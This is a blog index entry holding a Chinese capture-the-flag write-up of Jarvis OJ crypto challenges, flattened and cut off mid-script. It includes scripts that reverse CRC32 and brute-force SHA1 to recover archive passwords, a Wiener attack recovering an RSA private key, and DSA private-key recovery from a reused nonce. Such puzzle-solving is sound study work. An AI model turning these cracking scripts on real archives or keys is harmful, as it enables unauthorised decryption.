<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Jarvisoj-wp]]></title>
    <url>%2F2019%2F11%2F08%2FJarvisoj-wp%2F</url>
    <content type="text"><![CDATA[CryptoXgmRSA-集锦 xbkRSA-集锦 xyf加密结构使用的是Feistel结构 加密过程如下： 123456780,L,R1,R,L^R^K12,L^R^K1,L^K1^K23,L^K1^K2,R^K2^K34,R^K2^K3,L^R^K1^K3^K45,L^R^K1^K3^K4,L^K1^K2^K4^K56,L^K1^K2^K4^K5,R^K2^K3^K5^K67,R^K2^K3^K5^K6,L^R^K1^K3^K4^K6^K7 那么逻辑就很清楚了 123test = "50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7"R_test^K2^K3^K5^K6 L_test^R_test^K1^K3^K4^K6^K7R_flag^K2^K3^K5^K6 L_flag^R_flag^K1^K3^K4^K6^K7 然后解密脚本如下： 123456789101112131415161718192021222324252627282930#!/usr/bin/python#coding=utf-8#owner: IFpop#time: 2019/10/29#这里本来想着用python3实现这个过程，但是关于hex解码，在python3上貌似不能解码奇数，但可能是我代码写错了，希望解决了的大神可以告诉我怎么实现test = '50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'test_out = '66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'flag_out = '44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'L_tesd = test.decode('hex')[0:27]R_test = test.decode('hex')[27:54]L_Ktest = test_out.decode('hex')[0:27]R_Ktest = test_out.decode('hex')[27:54]def xor(a,b): assert len(a)==len(b) c="" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return cL_Kflag = flag_out.decode('hex')[0:27]R_Kflag = flag_out.decode('hex')[27:54]R_flag = xor(L_Kflag,xor(L_Ktest,R_test))L_flag = xor(xor(xor(xor(L_tesd,R_test), R_Ktest),R_Kflag), R_flag)print(L_flag+R_flag)#flag&#123;festel_weak_666_10fjid9vh12h3nvm&#125; xcaesar123456789def caesar_encrypt(m,k): r="" for i in m: r+=chr((ord(i)+k)%128) return rfrom secret import m,kprint caesar_encrypt(m,k).encode("base64")#output:bXNobgJyaHB6aHRwdGgE 程序很明显，先将明文进行凯撒加密，随后对其进行base64编码，所以脚本如下： 123456789101112131415161718192021222324252627#!/usr/bin/python#coding=utf-8#owner: IFpop#time: 2019/10/29import stringimport base64import sysstr = "bXNobgJyaHB6aHRwdGgE"str = base64.b64decode(str)print(str)for i in range(26): ans = "" for c in str: if c &gt;= 'A' and c &lt;= 'Z': if c.isalpha(): ans += chr((ord(c) + i-65)%26+65) else: ans += c else: if c.isalpha(): ans += chr((ord(c) + i-97)%26+97) else: ans += c print(ans)# flag&#123;kaisamima&#125; xbase6412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# /usr/bin/python# encoding: utf-8base64_table = ['=','A', 'B', 'C', 'D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z', 'a', 'b', 'c', 'd','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z', '0', '1', '2', '3','4','5','6','7','8','9', '+', '/'][::-1]def encode_b64(s): l = len(s) i = 0 result = '' while i &lt; l: # 将字符转换为二进制编码，然后对齐 s1 = s[i] b1 = bin(ord(s1))[2:] cb1 = b1.rjust(8, '0' i += 1 if i &gt;= l: cb2 = '00000000' else: s2 = s[i] b2 = bin(ord(s2))[2:] cb2 = b2.rjust(8, '0') i += 1 if i &gt;= l: cb3 = '00000000' else: s3 = s[i] b3 = bin(ord(s3))[2:] cb3 = b3.rjust(8, '0') # 将三字节转换为四字节 cb = cb1 + cb2 + cb3 rb1 = cb[:6] rb2 = cb[6:12] rb3 = cb[12:18] rb4 = cb[18:] # 转换后的编码转为十进制备用 ri1 = int(rb1, 2) ri2 = int(rb2, 2) ri3 = int(rb3, 2) ri4 = int(rb4, 2) # 处理末尾为０的情况，以＇＝＇填充 if i - 1 &gt;= l and ri3 == 0: ri3 = -1 if i &gt;= l and ri4 == 0: ri4 = -1 result += base64_table[ri1] + base64_table[ri2] + base64_table[ri3] + base64_table[ri4] i += 1 return resultprint encode_b64(open("flag","r").read())#output: mZOemISXmpOTkKCHkp6Rgv== 乍一看，以为直接是，直接解码，发现是失败的，看看上面的base64_table，发现跟本来的不太一样，现在采取的策略是将原本的base64表与现在的base64表进行一个映射，然后就可以用base64进行解码了。脚本： 1234567891011121314151617#!/usr/bin/python#coding=utf-8#owner: IFpop#time: 2019/10/29import stringxbase64=['/', '+', '9', '8', '7', '6', '5', '4', '3', '2', '1', '0', 'z', 'y', 'x', 'w', 'v', 'u', 't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'k', 'j', 'i', 'h', 'g', 'f', 'e', 'd', 'c', 'b', 'a', 'Z', 'Y', 'X', 'W', 'V', 'U', 'T', 'S', 'R', 'Q', 'P', 'O', 'N', 'M', 'L', 'K', 'J', 'I', 'H', 'G', 'F', 'E', 'D', 'C', 'B', 'A', '=']base64= ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/', '=']str='mZOemISXmpOTkKCHkp6Rgv=='s=''for i in str: s+=base64[xbase64.index(i)]print(s)# ZmxhZ3toZWxsb194bWFufQ==print(s.decode('base64'))# flag&#123;hello_xman&#125; CryRSA-集锦 rsarsappendRSA-集锦 bbencode下载下来是一个python文件： 12345678910111213141516flag = open("flag", "r").read().strip()assert len(flag) == 32def str2num(s): return int(s.encode('hex'), 16)def bbencode(n): a = 0 for i in bin(n)[2:]: a = a &lt;&lt; 1 if (int(i)): a = a ^ n if a &gt;&gt; 256: a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L return aprint bbencode(str2num(flag))#result:61406787709715709430385495960238216763226399960658358000016620560764164045692 这个加密先将flag转成二进制，然后根据每一位二进制数，对a进行操作，也就是一直对其循环加密就能得到flag(这里为什么我也没想明白) 123456789101112131415161718192021222324#coding=utf-8#owner:IFpop#time:2019/10/29from Crypto.Util import numberdef bbencode(n): a = 0 for i in bin(n)[2:]: a = a &lt;&lt; 1 if (int(i)): a = a ^ n if a &gt;&gt; 256: a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L return aflag = 61406787709715709430385495960238216763226399960658358000016620560764164045692for i in range(1000000): flag = bbencode(flag) #flag -- 66 6c 61 67 if('666c6167' == str(hex(flag)[2:10])): print(i) print(number.long_to_bytes(flag)) break#flag&#123;you_xian_yu_huan_le_duo_!!&#125; Complicated Crypto 五层密码，好复杂 CRC爆破下载下来是一个被加密的压缩包：Complicated Crypto.7z 由于7z的压缩包是无视伪加密的，但有没有密码的相关信息，使用winrar打开可以看到有四个文件，其中有个名称叫做CRC Collision，所以现在尝试进行CRC爆破 可以直接使用脚本进行攻击，6位爆破神器下载地址: 123456python crc32.py reverse 0xA58A1926#_CRC32python crc32.py reverse 0x4DAD5967#_i5_n0python crc32.py reverse 0x4DAD5967#t_s4f3 或者使用这个： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#crc32_util.py# -*- coding: utf-8 -*- import itertoolsimport binasciiimport string class crc32_reverse_class(object): def __init__(self, crc32, length, tbl=string.printable, poly=0xEDB88320, accum=0): self.char_set = set(map(ord, tbl)) self.crc32 = crc32 self.length = length self.poly = poly self.accum = accum self.table = [] self.table_reverse = [] def init_tables(self, poly, reverse=True): # build CRC32 table for i in range(256): for j in range(8): if i &amp; 1: i &gt;&gt;= 1 i ^= poly else: i &gt;&gt;= 1 self.table.append(i) assert len(self.table) == 256, "table is wrong size" # build reverse table if reverse: found_none = set() found_multiple = set() for i in range(256): found = [] for j in range(256): if self.table[j] &gt;&gt; 24 == i: found.append(j) self.table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) &gt; 1: found_multiple.add(i) assert len(self.table_reverse) == 256, "reverse table is wrong size" def rangess(self, i): return ', '.join(map(lambda x: '[&#123;0&#125;,&#123;1&#125;]'.format(*x), self.ranges(i))) def ranges(self, i): for kg in itertools.groupby(enumerate(i), lambda x: x[1] - x[0]): g = list(kg[1]) yield g[0][1], g[-1][1] def calc(self, data, accum=0): accum = ~accum for b in data: accum = self.table[(accum ^ b) &amp; 0xFF] ^ ( (accum &gt;&gt; 8) &amp; 0x00FFFFFF) accum = ~accum return accum &amp; 0xFFFFFFFF def findReverse(self, desired, accum): solutions = set() accum = ~accum stack = [(~desired,)] while stack: node = stack.pop() for j in self.table_reverse[(node[0] &gt;&gt; 24) &amp; 0xFF]: if len(node) == 4: a = accum data = [] node = node[1:] + (j,) for i in range(3, -1, -1): data.append((a ^ node[i]) &amp; 0xFF) a &gt;&gt;= 8 a ^= self.table[node[i]] solutions.add(tuple(data)) else: stack.append(((node[0] ^ self.table[j]) &lt;&lt; 8,) + node[1:] + (j,)) return solutions def dfs(self, length, outlist=['']): tmp_list = [] if length == 0: return outlist for list_item in outlist: tmp_list.extend([list_item + chr(x) for x in self.char_set]) return self.dfs(length - 1, tmp_list) def run_reverse(self): self.init_tables(self.poly) desired = self.crc32 accum = self.accum if self.length &gt;= 4: patches = self.findReverse(desired, accum) for patch in patches: checksum = self.calc(patch, accum) print 'verification checksum: 0x&#123;0:08x&#125; (&#123;1&#125;)'.format( checksum, 'OK' if checksum == desired else 'ERROR') for item in self.dfs(self.length - 4): patch = map(ord, item) patches = self.findReverse(desired, self.calc(patch, accum)) for last_4_bytes in patches: if all(p in self.char_set for p in last_4_bytes): patch.extend(last_4_bytes) print '[find]: &#123;1&#125; (&#123;0&#125;)'.format( 'OK' if self.calc(patch, accum) == desired else 'ERROR', ''.join(map(chr, patch))) else: for item in self.dfs(self.length): if crc32(item) == desired: print '[find]: &#123;0&#125; (OK)'.format(item) def crc32_reverse(crc32, length, char_set=string.printable, poly=0xEDB88320, accum=0): obj = crc32_reverse_class(crc32, length, char_set, poly, accum) obj.run_reverse() def crc32(s): return binascii.crc32(s) &amp; 0xffffffff 123456from crc32_util import *crc = [0x7C2DF918, 0xA58A1926, 0x4DAD5967]for i in crc: crc32_reverse(i, 6) 连起来就是_CRC32_i5_n0t_s4f3,这个就是压缩包的密码 vigenere打开后里面，还有个压缩包，查看里面的tips.txt文件，是个维吉尼亚密码 但是密钥数量太多，现在上解密模板网站上找到相应解密模板 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# -*- coding: utf-8 -*-#vigenereDictionaryHacker.pyimport detectEnglishLETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'def translateMessage(key, message, mode): translated = [] # 存储加密/解密消息字符串 keyIndex = 0 key = key.upper() for symbol in message: # 遍历每个消息里的字符的消息 num = LETTERS.find(symbol.upper()) if num != -1: # -1 意味着转换为大写在LETTERS找不到 if mode == 'encrypt': num += LETTERS.find(key[keyIndex]) # 加密时相加 elif mode == 'decrypt': num -= LETTERS.find(key[keyIndex]) # 解密时相减 num %= len(LETTERS) # 处理潜在的循环 # 添加转换后加密/解密字符 if symbol.isupper(): translated.append(LETTERS[num]) elif symbol.islower(): translated.append(LETTERS[num].lower()) keyIndex += 1 # 继续下一个用密钥字符来解密 if keyIndex == len(key): keyIndex = 0 else: # 字符不在LETTERS里直接添加 translated.append(symbol) return ''.join(translated)def decryptMessage(key, message): return translateMessage(key, message, 'decrypt')def hackVigenere(ciphertext): fo = open('keys.txt') words = fo.readlines() fo.close() for word in words: word = word.strip() decryptedText = decryptMessage(word, ciphertext) if detectEnglish.isEnglish(decryptedText, wordPercentage=40): print('------------------------&gt;&gt;&gt;Notice!&lt;&lt;&lt;----------------------') print('Possible encryption break:') print('-&gt;&gt;Possible key: ' + str(word)) print('-&gt;&gt;Possible plaintext: ' + decryptedText[:100]) print('Enter D for done, or just press Enter to continue breaking:') response = raw_input('&gt; ') if response.upper().startswith('D'): return decryptedTextdef main(): ciphertext = """rla xymijgpf ppsoto wq u nncwel ff tfqlgnxwzz sgnlwduzmy vcyg ib bhfbe u tnaxua ff satzmpibf vszqen eyvlatq cnzhk dk hfy mnciuzj ou s yygusfp bl dq e okcvpa hmsz vi wdimyfqqjqubzc hmpmbgxifbgi qs lciyaktb jf clntkspy drywuz wucfm""" hackedMessage = hackVigenere(ciphertext) if hackedMessage != None: print('\nCopy Possible plaintext to the clipboard:\n') print(hackedMessage) else: print('Failed to hack encryption.')if __name__ == '__main__': main() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*-# detectEnglish.py# 英文单词探测模块# 模块引用:# import detectEnglish# detectEnglish.isEnglish(someString) # 返回真或假# 模块需要一个包含常见英文单词的"words.txt"，下载地址：http://invpy.com/dictionary.txt# 将dictionary.txt改成word.txtUPPERLETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'LETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + ' \t\n'def loadDictionary(): dictionaryFile = open('word.txt') englishWords = &#123;&#125; for word in dictionaryFile.read().split('\n'): englishWords[word] = None dictionaryFile.close() return englishWordsENGLISH_WORDS = loadDictionary()def getEnglishCount(message): message = message.upper() message = removeNonLetters(message) possibleWords = message.split() # print possibleWords if possibleWords == []: return 0.0 # 没有单词返回0.0 matches = 0 for word in possibleWords: if word in ENGLISH_WORDS: matches += 1 return float(matches) / len(possibleWords)def removeNonLetters(message): lettersOnly = [] for symbol in message: if symbol in LETTERS_AND_SPACE: lettersOnly.append(symbol) return ''.join(lettersOnly)def isEnglish(message, wordPercentage=20, letterPercentage=85): # 默认设置转换后的message中单词的20%能在words.txt中的单词列表找到 # 默认设置转换后的message中85%是字母或空格 # (not punctuation or numbers). wordsMatch = getEnglishCount(message) * 100 &gt;= wordPercentage numLetters = len(removeNonLetters(message)) messageLettersPercentage = float(numLetters) / len(message) * 100 lettersMatch = messageLettersPercentage &gt;= letterPercentage return wordsMatch and lettersMatch 12345$ python vigenereDictionaryHacker.py------------------------&gt;&gt;&gt;Notice!&lt;&lt;&lt;---------------------- Possible encryption break: -&gt;&gt;Possible key: YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV -&gt;&gt;Possible plaintext: the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar 然后在线解密： 1the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny vigenere cipher funny就是密码 sha1爆破然后解压： 1234567恭喜!现在我们遇到一个问题,我们有一个zip文件,但我们不知道完整的解压密码。幸好我们知道解压密码的一部分sha1值。你能帮我们找到的密码吗?不完整的密码：&quot;*7*5-*4*3?&quot; *代表可打印字符不完整的sha1：&quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot; *代表可打印字符人生苦短，我用Python。 使用模板进行sha1爆破，下面是个demo程序： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#break_sha1.pyimport hashlibimport timedef match(h,pwd): hl=list(h) if hl[0]=='6': if hl[1]=='1': if hl[2]=='9': if hl[3]=='c': if hl[4]=='2': if hl[5]=='0': if hl[6]=='c': if hl[8]=='a': if hl[16]=='9': if hl[24]=='b': if hl[32]=='e': print "Find!" print "Hash:%s" %h print "Password:%s" %pwd matched=1 return matched else: matched=0 return matcheddef generate(): x=range(32,128) for i in x: for j in x: for k in x: for l in x: pwd=chr(i)+'7'+chr(j)+'5-'+chr(k)+'4'+chr(l)+'3?' sha1_hash=hashlib.sha1() sha1_hash.update(pwd) h=sha1_hash.hexdigest() matched=match(h,pwd) if matched: print "congratulation!" return 0 else: passdef main(): start=time.clock() print "Breaking,please wait!" generate() end=time.clock() print "Used time:%s" %(end-start)if __name__ == '__main__': main() 得到的结果是： 123456Breaking,please wait! Find! Hash:619c20c4a4de75519be9a8b7b7cbfa54e8b4365bPassword:I7~5-s4F3? congratulation! Used time:70.78125 MD5将easy SHA1解压之后 12345Hello World ;-)MD5校验真的安全吗？有没有两个不同的程序MD5却相同呢？如果有的话另一个程序输出是什么呢？解压密码为单行输出结果。 看到这段文字，说另一个程序输出是什么，不知道思路，网上查查，找到一篇这样的blog 将其中两个程序下载运行： 1234#第一个输出Hello World ;-)#第二个输出Goodbye World :-( 所以这里的密码应该是Goodbye World :-( RSA解压后，最后是一个RSA加密：使用openssl查看公钥文件: 12345678910111213141516171819202122RSA Public-Key: (1026 bit) Modulus: 02:8f:ff:9d:d3:e6:fe:97:81:64:9e:b7:fe:5e:93: 03:cf:69:63:47:c4:11:0b:c4:ba:39:69:f0:b1:16: 69:84:0c:51:d8:1a:68:42:b6:df:2b:09:0f:21:cd: 76:d4:37:1a:8c:0e:47:04:8c:96:5e:ca:5b:46:91: 3a:fb:b8:da:05:20:72:a0:56:6d:70:39:c6:18:ab: a9:06:57:59:b0:59:e2:9e:48:5d:c5:06:1a:16:ac: 63:12:94:38:d9:35:4e:65:df:57:47:54:6b:85:db: 3d:69:98:19:c4:b7:73:2d:f9:27:c7:08:4a:5d:52: d6:e6:d6:aa:c1:44:62:34:25 Exponent: 01:f8:fb:a4:10:05:2d:f7:ed:a3:46:2f:1a:ac:d6: 9e:40:76:04:33:ca:33:57:67:cd:73:05:a3:d0:90: 80:5a:5f:d4:05:dd:6e:ea:70:e9:8f:0c:a1:e1:cf: 25:47:48:67:1b:f0:c9:80:06:c2:0e:ee:1d:62:79: 04:35:09:fe:7a:98:23:8b:43:91:60:a5:61:2d:a7: 1e:90:45:14:e8:12:80:61:7e:30:7c:3c:d3:31:3f: a4:c6:fc:a3:31:59:d0:44:1f:bb:18:d8:3c:af:4b:d4:6f:6b:92:97:a8:0a:14:2d:d6:9b:f1:a3:57:cc: b5:e4:c2:00:b6:d9:0f:15:a3Modulus=28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425 看的出来，这里需要维纳攻击: 使用rsa-wiener-attack工具求出d, 1234567if __name__ == &quot;__main__&quot;: #test_is_perfect_square() #print(&quot;-------------------------&quot;) n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 d = hack_RSA(e,n) print(&quot;d=&quot;,d) 得到d = 8264667972294275017293339772371783322168822149471976834221082393409363691895 下面就可以直接写解密脚本了： 123456789101112131415#coding=utf-8#owner:IFpop#time:2019/10/29import gmpy2from Crypto.Util import numbern = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597d = 8264667972294275017293339772371783322168822149471976834221082393409363691895with open('flag.enc','rb')as f: c = number.bytes_to_long(f.read()) m = pow(c,d,n)print(number.long_to_bytes(m))#flag&#123;W0rld_Of_Crypt0gr@phy&#125; DSA关于DSA之前也没怎么接触过，现在遇到，就顺便总结一下 知识点概述 是Schnorr和ElGamal签名算法的变种，被美国NIST作为数字签名标准 它是另一种公开密钥算法，它不能用作加密，只用作数字签名。 DSA使用公开密钥，为接受者验证数据的完整性和数据发送者的身份。它也可用于由第三方去确定签名和所签数据的真实性。DSA算法的安全性基于解离散对数的困难性，这类签字标准具有较大的兼容性和适用性，成为网络安全体系的基本构件之一。 其他知识点总结 解题 DSA是基于整数有限域离散对数难题的，其安全性与RSA相比差不多。DSA的一个重要特点是两个素数公开，这样，当使用别人的p和q时，即使不知道私钥x，你也能确认它们是否是随机产生的，还是作了手脚。 可以使用openssl方便地进行dsa签名和验证。 签名与验证： 1234&gt; openssl dgst -sha1 -sign dsa_private.pem -out sign.bin message.txt&gt; openssl sha1 -verify dsa_public.pem -signature sign.bin message.txt&gt; &gt; &gt; 本题的攻击方法曾被用于PS3的破解，答案格式：CTF{x}(x为私钥，请提交十进制格式) 下载文件解压，发现里面有着四个packet以及一个公钥 使用上述命令可以验证通过。 其中的message文件可以查看，可以找到一些信息: 123456789#message1Digital Signature Algorithm (DSA)是Schnorr和ElGamal签名算法的变种，被美国NIST作为DSfS(DigitalSignature Standard)。http://baike.baidu.com/item/DSA%E7%AE%97%E6%B3%95#message2这里简要介绍了一些asn1结构编码#message3介绍了一些openssl#message4。。。 查了一下asn1的知识，发现openssl中就存在着asn1parse转码操作，所以以此查看sign.bin中的信息 1openssl asn1parse [-inform PEM|DER] [-in filename] [-out filename] [-noout] [-offset number] [-length number] [-i] [- structure filename] [-strparse offset] 12345678910111213141516171819 openssl asn1parse -inform der -in packet1/sign1.bin 0:d=0 hl=2 l= 45 cons: SEQUENCE 2:d=1 hl=2 l= 21 prim: INTEGER :8158B477C5AA033D650596E93653C730D26BA409 25:d=1 hl=2 l= 20 prim: INTEGER :165B9DD1C93230C31111E5A4E6EB5181F990F702 openssl asn1parse -inform der -in packet2/sign2.bin 0:d=0 hl=2 l= 44 cons: SEQUENCE 2:d=1 hl=2 l= 20 prim: INTEGER :60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24:d=1 hl=2 l= 20 prim: INTEGER :3DC8921BA26B514F4D991A85482750E0225A15B5openssl asn1parse -inform der -in packet3/sign3.bin 0:d=0 hl=2 l= 44 cons: SEQUENCE 2:d=1 hl=2 l= 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24:d=1 hl=2 l= 20 prim: INTEGER :30EB88E6A4BFB1B16728A974210AE4E41B42677Dopenssl asn1parse -inform der -in packet4/sign4.bin 0:d=0 hl=2 l= 44 cons: SEQUENCE 2:d=1 hl=2 l= 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC #r24:d=1 hl=2 l= 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 #s r = (g^k mod\ p) mod\ q \qquad \qquad \\ s = [k^{-1}*(H(M)+xr)] mod\ q由于对多条消息进行数字签名时，k是不变的，所以： k*s_1 = H(M_1)+xr(mod\ q) \quad (1) \\ k*s_2 = H(M_2)+xr(mod\ p) \quad (2)\\由(1)*s2、(2)*s1得： k*s_1*s_2 = s_2*H(M_1)+s_2*xr(mod\ q) \\ k*s_2*s_1 = s_1*H(M_2)+s_1*xr(mod\ q)最终可以解得: x = [s_2*H(M_1)-s_1*H(M_2)]（s_1*r-s_2*r）^{-1} mod\ q而上面的分析可以发现，只有packet3和packet4的r是相同的，所以脚本如下： 1234567891011121314151617181920212223242526from Crypto.PublicKey import DSAfrom hashlib import sha1import gmpy2with open('dsa_public.pem','rb') as f: key = DSA.importKey(f.read()) y = key.y g = key.g p = key.p q = key.qf3 = open("packet3/message3", 'rb')f4 = open("packet4/message4", 'rb')data3 = f3.read()data4 = f4.read()sha = sha1()sha.update(data3)m3 = int(sha.hexdigest(), 16)sha = sha1()sha.update(data4)m4 = int(sha.hexdigest(), 16)s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677Ds4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CCx = ((s4*m3-s3*m4)*gmpy2.invert(s3*r-s4*r,q))%qprint(x)#520793588153805320783422521615148687785086070744 所以CTF{520793588153805320783422521615148687785086070744} vigenere这题要使用kriski测试法，太麻烦了，直接上大佬程序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#!usr/env/python#coding=utf-8#owner: IFpop#time: 2910/11/2from base64 import b64encode, b64decodeimport sysimport osimport randomfrom fractions import gcdfrom math import sqrt candi_count = 0chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'encrypted = "a7TFeCShtf94+t5quSA5ZBn4+3tqLTl0EvoMsNxeeCm50Xoet+1fvy821r6Fe4fpeAw1ZB+as3Tphe8xZXQ/s3tbJy8BDzX4vN5svYqIZ96rt35dKuz0DfCPf4nfKe300fM9utiauTe5tgs5utLpLTh0FzYx0O1sJYKgJvul0OfiuTl00BCks+aaJZm8Kwb4u+LtLCqbZ96lv3bieCahtegx+7nzqyO6YCb4b9LovCELZ9Pe0L5rLSaBDzXaftxseAw1JzCF0MGjeCacKb69u9TlgCudZT6Os3ojhcWxD914vNHfeCuaJvH4s4aarBKlGdsT8G4UKZhfJB+y0LbjqCOnZT6baF1WiZeNtfsNtuoo+c==" def shift(char, key, rev = False): if not char in chars: return char if rev: return chars[(chars.index(char) - chars.index(key)) % len(chars)] else: print((chars.index(char) + chars.index(key)) % len(chars)) return chars[(chars.index(char) + chars.index(key)) % len(chars)] def encrypt(message, key): encrypted = b64encode(message.encode('ascii')).decode('ascii') return ''.join([shift(encrypted[i], key[i % len(key)]) for i in range(len(encrypted))]) def original_decrypt(encrypted, key): encrypted = ''.join([shift(encrypted[i], key[i % len(key)], True) for i in range(len(encrypted))]) return b64decode(encrypted.encode('ascii')).decode('ascii') # not using encode or decode asciidef decrypt(encrypted, key): encrypted = ''.join([shift(encrypted[i], key[i % len(key)], True) for i in range(len(encrypted))]) return b64decode(encrypted) def generate_random_key(length = 5): return ''.join(map(lambda a : chars[a % len(chars)], os.urandom(length))) def Kasiski_exam(encrypted): strlist = [] count = 0 indexlist = [] for i in range(len(encrypted)): for j in range(i,len(encrypted)): if j-i&lt;3: continue start = i search_str = encrypted[i:j] while True: detect = encrypted[start:].find(search_str) if detect == -1: break else: count+=1 if count==2: strlist.append(search_str) indexlist.append(detect+j-i) start += detect+(j-i) if count==0: break count=0 print(indexlist) print(strlist) anslist = my_factor(indexlist) return anslist def my_factor(numlist): factor_list = [] for x in range(2,int(sqrt(numlist[0]))+1): if numlist[0]%x == 0 and x&gt;=5 and x&lt;=14: factor_list.append(x) for i in range(1,len(numlist)): anslist = list(factor_list) num = numlist[i] for x in factor_list: if num%x !=0: anslist.remove(x) return anslist def is_ascii(string): if string: for char in string: if char &gt; 126: return False if char&lt;32 and not char==10: return False return True def split_str_and_isascii(plain,num,block): start = 3*block for i in range(start,len(plain),9): if not is_ascii(plain[i:i+num]): return False return True # if key_len == 12def brute_key(encrypted,key_len): global candi_count candi_key_list = [[],[],[]] for block in range(int(key_len/4)): for a in chars: for b in chars: if not split_str_and_isascii(decrypt(encrypted,a+b+"aa"),1,block): continue for c in chars: if not split_str_and_isascii(decrypt(encrypted,a+b+c+"a"),2,block): continue for d in chars: if split_str_and_isascii(decrypt(encrypted,a+b+c+d),3,block): candi_key_list[block].append(a+b+c+d) candi_count+=1 return candi_key_list #if key_len == 6def brute_key_6(encrypted,key_len): global candi_count candi_key_list = [] for block in range(int(key_len/4)): for a in chars: for b in chars: if not split_str_and_isascii(decrypt(encrypted,a+b+"aa"),1,block): continue for c in chars: if not split_str_and_isascii(decrypt(encrypted,a+b+c+"a"),2,block): continue for d in chars: if split_str_and_isascii(decrypt(encrypted,a+b+c+d),3,block): candi_key_list.append(a+b+c+d) candi_count+=1 return candi_key_list def main(): # ==== kasiski examination ==== factor_list = Kasiski_exam(encrypted) # [6,12] key_len = factor_list[1] # ==== brute force attack to base64 ==== print("Start brute force...") candi_key1,candi_key2,candi_key3 = brute_key(encrypted,key_len) print(candi_key1) print(candi_key2) print(candi_key3) # ==== key candidate ==== keylist = [] for key1 in candi_key1: for key2 in candi_key2: for key3 in candi_key3: keylist.append(key1+key2+key3) print(candi_count) print(keylist) # if "TWCTF&#123;" in decrypted, It is highly possible that the key is correct. for key in keylist: dec = decrypt(encrypted,key) check = b"TWCTF&#123;" if check in dec: print("--------- key candidate : decrypted ---------------") print(key,":",dec) print() if __name__ == '__main__': main()#TWCTF&#123;C14ss1caL CiPhEr iS v3ry fun&#125; superexpress下载下来两个文件： 12345678910111213141516171819#problem.pyimport syskey = '****CENSORED***************'flag = 'TWCTF&#123;*******CENSORED********&#125;'if len(key) % 2 == 1: print("Key Length Error") sys.exit(1)n = len(key) / 2encrypted = ''for c in flag: c = ord(c) for a, b in zip(key[0:n], key[n:2*n]): #关于zip函数可以自己查一下 c = (ord(a) * c + ord(b)) % 251 encrypted += '%02x' % cprint encrypted#enc 805eed80cbbccb94c36413275780ec94a857dfec8da8ca94a8c313a8ccf9 由于最后的结果会模上251，所以key的所有字母的ASCII一定在251以内且长度为偶数，脚本如下： 1234567891011121314151617181920212223242526272829#!usr/env/python3#coding=utf-8#owner: IFpop#time: 2019/10/31import 